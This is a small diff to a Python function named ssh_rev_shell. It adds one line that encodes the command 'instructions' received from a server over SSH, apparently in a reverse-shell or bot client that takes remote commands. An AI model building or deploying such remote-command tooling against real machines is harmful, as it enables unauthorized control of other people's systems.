@@ -100,6 +100,7 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
 
         print("[!] Listening for instructions ...")
         server_instructions = ssh_session.recv(1024).decode().strip()
+        server_instructions = server_instructions.encode()
 
         if server_instructions:
             print(f"[!] Received command: {server_instructions}")
